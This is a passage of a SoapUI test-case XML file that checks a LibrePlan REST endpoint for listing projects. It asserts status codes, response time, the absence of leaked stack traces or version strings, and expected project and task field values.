<?xml version="1.0" encoding="UTF-8"?>
<con:testCase discardOkResults="false" failOnError="false" failTestCaseOnErrors="true" id="484db76a-c6a2-42ef-a7c2-3e3bc3dd746a" keepSession="false" name="Test Case 6 - Récupérer un projet" searchProperties="true" timeout="0" xmlns:con="http://eviware.com/soapui/config"><con:settings><con:setting id="484db76a-c6a2-42ef-a7c2-3e3bc3dd746afileName">Test-Case-6---Récupérer-un-projet</con:setting></con:settings><con:testStep id="258442cd-a3ea-4247-a393-128d0eb97c52" name="Properties" type="properties"><con:settings/><con:config xsi:type="con:PropertiesStep" saveFirst="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:properties><con:property><con:name>service-path</con:name><con:value>orderelements</con:value></con:property></con:properties></con:config></con:testStep><con:testStep id="3c49a7a6-438c-463b-a8c0-490329c9b38d" name="REST Request -  Récupérer tous les projets pour trouver Code du premier projet" type="restrequest"><con:settings/><con:config xsi:type="con:RestRequestStep" methodName="GET - Export all" resourcePath="/ws/rest/{service-path}/" service="LibrePlan" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:restRequest id="d21b2823-5c02-4a85-9033-a8bc3ba3fee3" mediaType="application/json" name="REST Request -  Récupérer tous les projets pour trouver Code du premier projet"><con:settings><con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;xml-fragment/></con:setting></con:settings><con:endpoint>http://localhost:8180/libreplan/</con:endpoint><con:request/><con:originalUri>http://localhost/libreplan/ws/rest/orderelements/</con:originalUri><con:assertion id="ca5b715c-2602-4fc1-b094-2bd62678319d" name="Valid HTTP Status Codes" type="Valid HTTP Status Codes"><con:settings/><con:configuration><codes>200</codes></con:configuration></con:assertion><con:assertion id="af83520d-c332-4817-ae06-11b4d1f92ce2" name="Response SLA" type="Response SLA Assertion"><con:configuration><SLA>1000</SLA></con:configuration></con:assertion><con:assertion type="Sensitive Information Exposure" id="b5466ad2-ef77-4762-9f1a-38799029753a" name="Sensitive Information Exposure"><con:configuration><AssertionSpecificExposureList>~(?s).*Runtime (E|e)rror.*###[Stacktrace] Can give hackers information about which software or language you are using</AssertionSpecificExposureList><AssertionSpecificExposureList>~(?s).*SQLSTATE: [A-Z0-9].*###[Database error messages] Internal database information can be misused by hackers</AssertionSpecificExposureList><AssertionSpecificExposureList>~(?s).*(s|S)tack:.*###[Stacktrace] Can give hackers information about which software or language you are using</AssertionSpecificExposureList><AssertionSpecificExposureList>~(?s).*(s|S)yntax (e|E)rror\s.*###[Stacktrace] Can give hackers information about which software or language you are using</AssertionSpecificExposureList><AssertionSpecificExposureList>~(?s).*\w+/\d{1,2}(\.\d{1,3})+.*###[Version x.y.z] Exposing version numbers gives
            unnecessary hints on your systems vulnerabilities</AssertionSpecificExposureList><AssertionSpecificExposureList>~(?s).*Invalid column name\s.*###[Database error messages] Internal database information can be misused by hackers</AssertionSpecificExposureList><AssertionSpecificExposureList>~(?s).*
            (ORA|EXP|IMP|KUP|UDE|UDI|DBV|LCD|QSM|OCI|RMAN|LFI|PLS|PLQ|AMD|CLSR|PROC|PROT|TNS|NNC|NLP|NNF|NMP|NCR|NZE|O2F|O2I|O2U|PCB|PCC|SQL|AUD|IMG|VID|DRG|LPX|LSX)-\d{5}\s
        .*###[Database error messages] Internal database information can be misused by hackers</AssertionSpecificExposureList><AssertionSpecificExposureList>~(?s).*(p|P)owered by:? ([a-zA-Z]+)( [a-zA-Z]+){0,3}( |/)\d\.\d{1,2}\.\d{1,3}.*###[Version x.y.z] Exposing version numbers gives
            unnecessary hints on your systems vulnerabilities</AssertionSpecificExposureList><AssertionSpecificExposureList>~(?s).*at [\w\$]+(\.[\w\$&lt;>\[\],]+|\.\.ctor)+(\((([\w\$&lt;>\`\[\]]+ [\w\$&lt;>]+, )*(([\w\$&lt;>\`\[\]]+
            [\w\$&lt;>]+)))\)|\(\))
        .*###[Stacktrace] Can give hackers information about which software or language you are using</AssertionSpecificExposureList><AssertionSpecificExposureList>~(?s).*&lt;\w+:frame\s*class=".*"\s*line=".*"\s*method=".*"\s*/>.*###[Stacktrace] Can give hackers information about which software or language you are using</AssertionSpecificExposureList><AssertionSpecificExposureList>~(?s).*Traceback \(most recent call last\):.*###[Stacktrace] Can give hackers information about which software or language you are using</AssertionSpecificExposureList><AssertionSpecificExposureList>~(?s).*((I|i)ncorrect|(I|i)nvalid) (s|S)yntax.*###[Stacktrace] Can give hackers information about which software or language you are using</AssertionSpecificExposureList><AssertionSpecificExposureList>~(?s).*(s|S)tack ?(t|T)race.*###[Stacktrace] Can give hackers information about which software or language you are using</AssertionSpecificExposureList><AssertionSpecificExposureList>~(?s).*(e|E)rror was:\s.*###[Database error messages] Internal database information can be misused by hackers</AssertionSpecificExposureList><AssertionSpecificExposureList>~(?s).*(v|V)ersion:? \d\.\d{1,2}\.{1,3}-?.*###[Version x.y.z] Exposing version numbers gives
            unnecessary hints on your systems vulnerabilities</AssertionSpecificExposureList><AssertionSpecificExposureList>~(?s).*from [\w\$]+(\.[\w\$&lt;>]+)+:\d+:in `.+'.*###[Stacktrace] Can give hackers information about which software or language you are using</AssertionSpecificExposureList><AssertionSpecificExposureList>~(?s).*Error in process &lt;\d+\.\d+\.\d+> with exit value:.*###[Stacktrace] Can give hackers information about which software or language you are using</AssertionSpecificExposureList><AssertionSpecificExposureList>~(?s).*STACK\s?TRACE.*###[Stacktrace] Can give hackers information about which software or language you are using</AssertionSpecificExposureList><AssertionSpecificExposureList>~(?s).*Warning: [\w]+\(\) .+ in .+ on line \d{1,6}.*###[Stacktrace] Can give hackers information about which software or language you are using</AssertionSpecificExposureList><AssertionSpecificExposureList>~(?s).*((A|a)pache|vBulletin|MySQL|PostgreSQL|phpBB|Internet Information Services)( |/)\d{1,2}(\.\d{1,3})+
        .*###[Version x.y.z] Exposing version numbers gives
            unnecessary hints on your systems vulnerabilities</AssertionSpecificExposureList><AssertionSpecificExposureList>~(?s).*at [a-zA-Z][\w\$]*(\.[a-zA-Z][\w\$]*)+\((Unknown Source|Native
            Method|[a-zA-Z][\w\$]*\.([a-zA-Z]{3,5}):\d+)\)
        .*###[Stacktrace] Can give hackers information about which software or language you are using</AssertionSpecificExposureList><AssertionSpecificExposureList>~(?s).*[^\s]+\.rb:\d+:in `.+'.*###[Stacktrace] Can give hackers information about which software or language you are using</AssertionSpecificExposureList><AssertionSpecificExposureList>~(?s).*File ".+", line [0-9]{1,6}, in.*###[Stacktrace] Can give hackers information about which software or language you are using</AssertionSpecificExposureList><IncludeProjectSpecific>true</IncludeProjectSpecific><IncludeGlobal>false</IncludeGlobal></con:configuration></con:assertion><con:assertion type="Simple NotContains" name="Not Contains" id="ec9ac24e-5e38-4a7c-8d84-c6b88e7992e0"><con:configuration><token>Sorry, JavaScript must be enabled.&lt;br/>Change your browser options, then &lt;a href="">try again&lt;/a>.</token><ignoreCase>false</ignoreCase><useRegEx>false</useRegEx></con:configuration></con:assertion><con:assertion type="DataAndMetadataAssertion" id="3002b97b-91d4-4cfa-b20f-9e16951c8e5b" name="Smart Assertion"><con:configuration xsi:type="con:DataAndMetadataAssertion"><con:mode>Received Data</con:mode><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order-list[1]/ns1:order[1]/@calendar-name</con:path><con:element>@calendar-name</con:element><con:operatorId>1</con:operatorId><con:enabled>true</con:enabled><con:expectedValue>Default</con:expectedValue><con:caseSensitive>true</con:caseSensitive><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order-list[1]/ns1:order[1]/@dependencies-constraints-have-priority</con:path><con:element>@dependencies-constraints-have-priority</con:element><con:operatorId>1</con:operatorId><con:enabled>true</con:enabled><con:expectedValue>false</con:expectedValue><con:caseSensitive>true</con:caseSensitive><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order-list[1]/ns1:order[1]/@deadline</con:path><con:element>@deadline</con:element><con:operatorId>1</con:operatorId><con:enabled>true</con:enabled><con:expectedValue>2022-12-20</con:expectedValue><con:caseSensitive>true</con:caseSensitive><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order-list[1]/ns1:order[1]/@init-date</con:path><con:element>@init-date</con:element><con:operatorId>1</con:operatorId><con:enabled>true</con:enabled><con:expectedValue>2022-12-05</con:expectedValue><con:caseSensitive>true</con:caseSensitive><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order-list[1]/ns1:order[1]/@name</con:path><con:element>@name</con:element><con:operatorId>1</con:operatorId><con:enabled>true</con:enabled><con:expectedValue>PROJET_TEST1</con:expectedValue><con:caseSensitive>true</con:caseSensitive><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order-list[1]/ns1:order[1]/@code</con:path><con:element>@code</con:element><con:operatorId>1</con:operatorId><con:enabled>true</con:enabled><con:expectedValue>ORDER0002</con:expectedValue><con:caseSensitive>true</con:caseSensitive><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order-list[1]/ns1:order[1]/ns1:labels[1]</con:path><con:element>labels</con:element><con:operatorId>9</con:operatorId><con:enabled>true</con:enabled><con:expectedValue xsi:nil="true"/><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order-list[1]/ns1:order[1]/ns1:material-assignments[1]</con:path><con:element>material-assignments</con:element><con:operatorId>9</con:operatorId><con:enabled>true</con:enabled><con:expectedValue xsi:nil="true"/><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order-list[1]/ns1:order[1]/ns1:advance-measurements[1]</con:path><con:element>advance-measurements</con:element><con:operatorId>9</con:operatorId><con:enabled>true</con:enabled><con:expectedValue xsi:nil="true"/><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order-list[1]/ns1:order[1]/ns1:criterion-requirements[1]</con:path><con:element>criterion-requirements</con:element><con:operatorId>9</con:operatorId><con:enabled>true</con:enabled><con:expectedValue xsi:nil="true"/><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order-list[1]/ns1:order[1]/ns1:children[1]/ns1:order-line[1]/@deadline</con:path><con:element>@deadline</con:element><con:operatorId>1</con:operatorId><con:enabled>true</con:enabled><con:expectedValue>2022-12-15</con:expectedValue><con:caseSensitive>true</con:caseSensitive><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order-list[1]/ns1:order[1]/ns1:children[1]/ns1:order-line[1]/@init-date</con:path><con:element>@init-date</con:element><con:operatorId>1</con:operatorId><con:enabled>true</con:enabled><con:expectedValue>2022-12-05</con:expectedValue><con:caseSensitive>true</con:caseSensitive><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order-list[1]/ns1:order[1]/ns1:children[1]/ns1:order-line[1]/@name</con:path><con:element>@name</con:element><con:operatorId>1</con:operatorId><con:enabled>true</con:enabled><con:expectedValue>Tache1-P1</con:expectedValue><con:caseSensitive>true</con:caseSensitive><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order-list[1]/ns1:order[1]/ns1:children[1]/ns1:order-line[1]/@code</con:path><con:element>@code</con:element><con:operatorId>1</con:operatorId><con:enabled>true</con:enabled><con:expectedValue>ORDER0002-0003</con:expectedValue><con:caseSensitive>true</con:caseSensitive><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order-list[1]/ns1:order[1]/ns1:children[1]/ns1:order-line[1]/ns1:labels[1]</con:path><con:element>labels</con:element><con:operatorId>9</con:operatorId><con:enabled>true</con:enabled><con:expectedValue xsi:nil="true"/><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order-list[1]/ns1:order[1]/ns1:children[1]/ns1:order-line[1]/ns1:material-assignments[1]</con:path><con:element>material-assignments</con:element><con:operatorId>9</con:operatorId><con:enabled>true</con:enabled><con:expectedValue xsi:nil="true"/><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order-list[1]/ns1:order[1]/ns1:children[1]/ns1:order-line[1]/ns1:advance-measurements[1]</con:path><con:element>advance-measurements</con:element><con:operatorId>9</con:operatorId><con:enabled>true</con:enabled><con:expectedValue xsi:nil="true"/><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order-list[1]/ns1:order[1]/ns1:children[1]/ns1:order-line[1]/ns1:criterion-requirements[1]</con:path><con:element>criterion-requirements</con:element><con:operatorId>9</con:operatorId><con:enabled>true</con:enabled><con:expectedValue xsi:nil="true"/><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order-list[1]/ns1:order[1]/ns1:children[1]/ns1:order-line[1]/ns1:hours-groups[1]/ns1:hours-group[1]/@working-hours</con:path><con:element>@working-hours</con:element><con:operatorId>1</con:operatorId><con:enabled>true</con:enabled><con:expectedValue>5</con:expectedValue><con:caseSensitive>true</con:caseSensitive><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order-list[1]/ns1:order[1]/ns1:children[1]/ns1:order-line[1]/ns1:hours-groups[1]/ns1:hours-group[1]/@resource-type</con:path><con:element>@resource-type</con:element><con:operatorId>1</con:operatorId><con:enabled>true</con:enabled><con:expectedValue>WORKER</con:expectedValue><con:caseSensitive>true</con:caseSensitive><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order-list[1]/ns1:order[1]/ns1:children[1]/ns1:order-line[1]/ns1:hours-groups[1]/ns1:hours-group[1]/@code</con:path><con:element>@code</con:element><con:operatorId>1</con:operatorId><con:enabled>true</con:enabled><con:expectedValue>ORDER0002-0003-0001</con:expectedValue><con:caseSensitive>true</con:caseSensitive><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order-list[1]/ns1:order[1]/ns1:children[1]/ns1:order-line[1]/ns1:hours-groups[1]/ns1:hours-group[1]/ns1:criterion-requirements[1]</con:path><con:element>criterion-requirements</con:element><con:operatorId>9</con:operatorId><con:enabled>true</con:enabled><con:expectedValue xsi:nil="true"/><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order-list[1]/ns1:order[1]/ns1:children[1]/ns1:order-line[2]/@deadline</con:path><con:element>@deadline</con:element><con:operatorId>1</con:operatorId><con:enabled>true</con:enabled><con:expectedValue>2022-12-20</con:expectedValue><con:caseSensitive>true</con:caseSensitive><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order-list[1]/ns1:order[1]/ns1:children[1]/ns1:order-line[2]/@init-date</con:path><con:element>@init-date</con:element><con:operatorId>1</con:operatorId><con:enabled>true</con:enabled><con:expectedValue>2022-12-08</con:expectedValue><con:caseSensitive>true</con:caseSensitive><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order-list[1]/ns1:order[1]/ns1:children[1]/ns1:order-line[2]/@name</con:path><con:element>@name</con:element><con:operatorId>1</con:operatorId><con:enabled>true</con:enabled><con:expectedValue>Tache2-P1</con:expectedValue><con:caseSensitive>true</con:caseSensitive><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order-list[1]/ns1:order[1]/ns1:children[1]/ns1:order-line[2]/@code</con:path><con:element>@code</con:element><con:operatorId>1</con:operatorId><con:enabled>true</con:enabled><con:expectedValue>ORDER0002-0001</con:expectedValue><con:caseSensitive>true</con:caseSensitive><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order-list[1]/ns1:order[1]/ns1:children[1]/ns1:order-line[2]/ns1:labels[1]</con:path><con:element>labels</con:element><con:operatorId>9</con:operatorId><con:enabled>true</con:enabled><con:expectedValue xsi:nil="true"/><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order-list[1]/ns1:order[1]/ns1:children[1]/ns1:order-line[2]/ns1:material-assignments[1]</con:path><con:element>material-assignments</con:element><con:operatorId>9</con:operatorId><con:enabled>true</con:enabled><con:expectedValue xsi:nil="true"/><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order-list[1]/ns1:order[1]/ns1:children[1]/ns1:order-line[2]/ns1:advance-measurements[1]</con:path><con:element>advance-measurements</con:element><con:operatorId>9</con:operatorId><con:enabled>true</con:enabled><con:expectedValue xsi:nil="true"/><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order-list[1]/ns1:order[1]/ns1:children[1]/ns1:order-line[2]/ns1:criterion-requirements[1]</con:path><con:element>criterion-requirements</con:element><con:operatorId>9</con:operatorId><con:enabled>true</con:enabled><con:expectedValue xsi:nil="true"/><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order-list[1]/ns1:order[1]/ns1:children[1]/ns1:order-line[2]/ns1:hours-groups[1]/ns1:hours-group[1]/@working-hours</con:path><con:element>@working-hours</con:element><con:operatorId>1</con:operatorId><con:enabled>true</con:enabled><con:expectedValue>10</con:expectedValue><con:caseSensitive>true</con:caseSensitive><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order-list[1]/ns1:order[1]/ns1:children[1]/ns1:order-line[2]/ns1:hours-groups[1]/ns1:hours-group[1]/@resource-type</con:path><con:element>@resource-type</con:element><con:operatorId>1</con:operatorId><con:enabled>true</con:enabled><con:expectedValue>WORKER</con:expectedValue><con:caseSensitive>true</con:caseSensitive><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order-list[1]/ns1:order[1]/ns1:children[1]/ns1:order-line[2]/ns1:hours-groups[1]/ns1:hours-group[1]/@code</con:path><con:element>@code</con:element><con:operatorId>1</con:operatorId><con:enabled>true</con:enabled><con:expectedValue>ORDER0002-0001-0001</con:expectedValue><con:caseSensitive>true</con:caseSensitive><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order-list[1]/ns1:order[1]/ns1:children[1]/ns1:order-line[2]/ns1:hours-groups[1]/ns1:hours-group[1]/ns1:criterion-requirements[1]</con:path><con:element>criterion-requirements</con:element><con:operatorId>9</con:operatorId><con:enabled>true</con:enabled><con:expectedValue xsi:nil="true"/><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order-list[1]/ns1:order[1]/ns1:children[1]/ns1:order-line[3]/@deadline</con:path><con:element>@deadline</con:element><con:operatorId>1</con:operatorId><con:enabled>true</con:enabled><con:expectedValue>2022-12-12</con:expectedValue><con:caseSensitive>true</con:caseSensitive><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order-list[1]/ns1:order[1]/ns1:children[1]/ns1:order-line[3]/@init-date</con:path><con:element>@init-date</con:element><con:operatorId>1</con:operatorId><con:enabled>true</con:enabled><con:expectedValue>2022-12-05</con:expectedValue><con:caseSensitive>true</con:caseSensitive><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order-list[1]/ns1:order[1]/ns1:children[1]/ns1:order-line[3]/@name</con:path><con:element>@name</con:element><con:operatorId>1</con:operatorId><con:enabled>true</con:enabled><con:expectedValue>Tache3-P1</con:expectedValue><con:caseSensitive>true</con:caseSensitive><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order-list[1]/ns1:order[1]/ns1:children[1]/ns1:order-line[3]/@code</con:path><con:element>@code</con:element><con:operatorId>1</con:operatorId><con:enabled>true</con:enabled><con:expectedValue>ORDER0002-0002</con:expectedValue><con:caseSensitive>true</con:caseSensitive><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order-list[1]/ns1:order[1]/ns1:children[1]/ns1:order-line[3]/ns1:labels[1]</con:path><con:element>labels</con:element><con:operatorId>9</con:operatorId><con:enabled>true</con:enabled><con:expectedValue xsi:nil="true"/><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order-list[1]/ns1:order[1]/ns1:children[1]/ns1:order-line[3]/ns1:material-assignments[1]</con:path><con:element>material-assignments</con:element><con:operatorId>9</con:operatorId><con:enabled>true</con:enabled><con:expectedValue xsi:nil="true"/><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order-list[1]/ns1:order[1]/ns1:children[1]/ns1:order-line[3]/ns1:advance-measurements[1]</con:path><con:element>advance-measurements</con:element><con:operatorId>9</con:operatorId><con:enabled>true</con:enabled><con:expectedValue xsi:nil="true"/><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order-list[1]/ns1:order[1]/ns1:children[1]/ns1:order-line[3]/ns1:criterion-requirements[1]</con:path><con:element>criterion-requirements</con:element><con:operatorId>9</con:operatorId><con:enabled>true</con:enabled><con:expectedValue xsi:nil="true"/><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order-list[1]/ns1:order[1]/ns1:children[1]/ns1:order-line[3]/ns1:hours-groups[1]/ns1:hours-group[1]/@working-hours</con:path><con:element>@working-hours</con:element><con:operatorId>1</con:operatorId><con:enabled>true</con:enabled><con:expectedValue>20</con:expectedValue><con:caseSensitive>true</con:caseSensitive><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order-list[1]/ns1:order[1]/ns1:children[1]/ns1:order-line[3]/ns1:hours-groups[1]/ns1:hours-group[1]/@resource-type</con:path><con:element>@resource-type</con:element><con:operatorId>1</con:operatorId><con:enabled>true</con:enabled><con:expectedValue>WORKER</con:expectedValue><con:caseSensitive>true</con:caseSensitive><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order-list[1]/ns1:order[1]/ns1:children[1]/ns1:order-line[3]/ns1:hours-groups[1]/ns1:hours-group[1]/@code</con:path><con:element>@code</con:element><con:operatorId>1</con:operatorId><con:enabled>true</con:enabled><con:expectedValue>ORDER0002-0002-0001</con:expectedValue><con:caseSensitive>true</con:caseSensitive><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order-list[1]/ns1:order[1]/ns1:children[1]/ns1:order-line[3]/ns1:hours-groups[1]/ns1:hours-group[1]/ns1:criterion-requirements[1]</con:path><con:element>criterion-requirements</con:element><con:operatorId>9</con:operatorId><con:enabled>true</con:enabled><con:expectedValue xsi:nil="true"/><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order-list[1]/ns1:order[1]/ns1:children[1]/ns1:order-line[4]/@deadline</con:path><con:element>@deadline</con:element><con:operatorId>1</con:operatorId><con:enabled>true</con:enabled><con:expectedValue>2022-12-20</con:expectedValue><con:caseSensitive>true</con:caseSensitive><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order-list[1]/ns1:order[1]/ns1:children[1]/ns1:order-line[4]/@init-date</con:path><con:element>@init-date</con:element><con:operatorId>1</con:operatorId><con:enabled>true</con:enabled><con:expectedValue>2022-12-13</con:expectedValue><con:caseSensitive>true</con:caseSensitive><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order-list[1]/ns1:order[1]/ns1:children[1]/ns1:order-line[4]/@name</con:path><con:element>@name</con:element><con:operatorId>1</con:operatorId><con:enabled>true</con:enabled><con:expectedValue>Tache4-P1</con:expectedValue><con:caseSensitive>true</con:caseSensitive><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order-list[1]/ns1:order[1]/ns1:children[1]/ns1:order-line[4]/@code</con:path><con:element>@code</con:element><con:operatorId>1</con:operatorId><con:enabled>true</con:enabled><con:expectedValue>ORDER0002-0004</con:expectedValue><con:caseSensitive>true</con:caseSensitive><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order-list[1]/ns1:order[1]/ns1:children[1]/ns1:order-line[4]/ns1:labels[1]</con:path><con:element>labels</con:element><con:operatorId>9</con:operatorId><con:enabled>true</con:enabled><con:expectedValue xsi:nil="true"/><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order-list[1]/ns1:order[1]/ns1:children[1]/ns1:order-line[4]/ns1:material-assignments[1]</con:path><con:element>material-assignments</con:element><con:operatorId>9</con:operatorId><con:enabled>true</con:enabled><con:expectedValue xsi:nil="true"/><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order-list[1]/ns1:order[1]/ns1:children[1]/ns1:order-line[4]/ns1:advance-measurements[1]</con:path><con:element>advance-measurements</con:element><con:operatorId>9</con:operatorId><con:enabled>true</con:enabled><con:expectedValue xsi:nil="true"/><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order-list[1]/ns1:order[1]/ns1:children[1]/ns1:order-line[4]/ns1:criterion-requirements[1]</con:path><con:element>criterion-requirements</con:element><con:operatorId>9</con:operatorId><con:enabled>true</con:enabled><con:expectedValue xsi:nil="true"/><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order-list[1]/ns1:order[1]/ns1:children[1]/ns1:order-line[4]/ns1:hours-groups[1]/ns1:hours-group[1]/@working-hours</con:path><con:element>@working-hours</con:element><con:operatorId>1</con:operatorId><con:enabled>true</con:enabled><con:expectedValue>8</con:expectedValue><con:caseSensitive>true</con:caseSensitive><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order-list[1]/ns1:order[1]/ns1:children[1]/ns1:order-line[4]/ns1:hours-groups[1]/ns1:hours-group[1]/@resource-type</con:path><con:element>@resource-type</con:element><con:operatorId>1</con:operatorId><con:enabled>true</con:enabled><con:expectedValue>WORKER</con:expectedValue><con:caseSensitive>true</con:caseSensitive><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order-list[1]/ns1:order[1]/ns1:children[1]/ns1:order-line[4]/ns1:hours-groups[1]/ns1:hours-group[1]/@code</con:path><con:element>@code</con:element><con:operatorId>1</con:operatorId><con:enabled>true</con:enabled><con:expectedValue>ORDER0002-0004-0001</con:expectedValue><con:caseSensitive>true</con:caseSensitive><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order-list[1]/ns1:order[1]/ns1:children[1]/ns1:order-line[4]/ns1:hours-groups[1]/ns1:hours-group[1]/ns1:criterion-requirements[1]</con:path><con:element>criterion-requirements</con:element><con:operatorId>9</con:operatorId><con:enabled>true</con:enabled><con:expectedValue xsi:nil="true"/><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order-list[1]/ns1:order[2]/@calendar-name</con:path><con:element>@calendar-name</con:element><con:operatorId>1</con:operatorId><con:enabled>true</con:enabled><con:expectedValue>Default</con:expectedValue><con:caseSensitive>true</con:caseSensitive><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order-list[1]/ns1:order[2]/@dependencies-constraints-have-priority</con:path><con:element>@dependencies-constraints-have-priority</con:element><con:operatorId>1</con:operatorId><con:enabled>true</con:enabled><con:expectedValue>false</con:expectedValue><con:caseSensitive>true</con:caseSensitive><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
//ns1:order-list[1]/ns1:order[2]/@deadline</con:path><con:element>@deadline</con:element><con:operatorId>1</con:operatorId><con:enabled>true</con:enabled><con:expectedValue>2022-11-10</con:expectedValue><con:caseSensitive>true</con:caseSensitive><con:numberType>false</con:numberType></con:elements><con:elements><con:path>declare namespace ns1='http://rest.ws.libreplan.org';
